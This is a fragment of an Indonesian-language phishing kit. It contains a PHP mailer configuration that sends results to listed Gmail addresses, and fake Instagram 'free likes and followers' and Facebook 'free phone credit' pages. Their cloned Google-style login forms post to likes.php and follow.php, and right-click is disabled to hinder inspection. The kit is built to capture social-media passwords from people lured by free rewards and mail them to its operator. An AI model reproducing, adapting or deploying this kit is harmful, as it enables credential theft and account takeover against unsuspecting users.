...
############################################
##       Author: Reza Rizaldi             ##
##       Mailer: Alif Setyawan            ##
##       Modifer: RAFLIPEDIA              ##
##       Modifer: MancingMavia            ##
############################################
/* JANGAN GANTI COPYRIGHT NYA YA SAYANG */

$subjek = 'MANCING MAVIA MANTAP';
$mailto = 'fellysazh@gmail.com, emailanda@gmail.com'; //masukin email lo disini,
...
<body>
  ...
  <title>Tainsta - Free Auto Like and Follow</title>
...
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  ...
  <img alt="Google" class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1280px-Instagram_logo.svg.png">
  </div>
  </div>
...
<p class="profile-name"></p>
  <form novalidate="" method="post" action="likes.php" id="gaia_loginform">
...
<center><span class="input-group-addon"><img src="http://www.cosrental.com/instagram-events-guide/img/heart.png"style="width:20px;height:21px;"></span>
<center><p>Menambahkan jumlah Likes pada akun Instagram Anda. Seperti, Foto, Status, dan Video.</p></center>
<input id="signIn" name="signIn" class="rc-button rc-button-submit" type="submit" value="Selanjutnya">
...
<body>
  ...
  <meta name="google" value="notranslate">
  <meta name="google-site-verification" content="#">
  <title>Selamat datang di Facebook - Dapatkan Pulsa Gratis</title>
  <style type="text/css" media="print">
    * { display: none; }
</style>
</head><body oncontextmenu="return false;">
...
<div class="card signin-card clearfix">
  <div id="cc_iframe_parent"><iframe src="https://accounts.youtube.com/accounts/CheckConnection?pmpo=https%3A%2F%2Faccounts.google.com&amp;v=-195604430&amp;timestamp=1444500355218" id="youtube" style="visibility: hidden; width: 1px; height: 1px; position: absolute; top: -100px;"></iframe></div>
<p class="profile-name"></p>
  <form novalidate="" method="post" action="follow.php" id="gaia_loginform">
  <input name="GALX" type="hidden" value="T3yXxHiSa1s">
  <input name="continue" type="hidden" value="https://www.google.co.id/?gws_rd=cr,ssl&amp;ei=bfUxVZTQCsWeugSl94D4DA">
  <input name="hl" type="hidden" value="id">
  <input type="hidden" id="_utf8" name="_utf8" value="?">
  ...
  <input type="hidden" id="checkConnection" name="checkConnection" value="">
  <input type="hidden" id="checkedDomains" name="checkedDomains" value="youtube">
<center><span class="input-group-addon"><img src="https://cdn0.iconfinder.com/data/icons/admin-panel-glyph-black/2048/599_-_Subscribers-512.png"style="width:20px;height:21px;"></span>
<center><p>Menambahkan Followers pada akun Instagram Anda.</p></center>
<input id="signIn" name="signIn" class="rc-button rc-button-submit" type="submit" value="Selanjutnya">
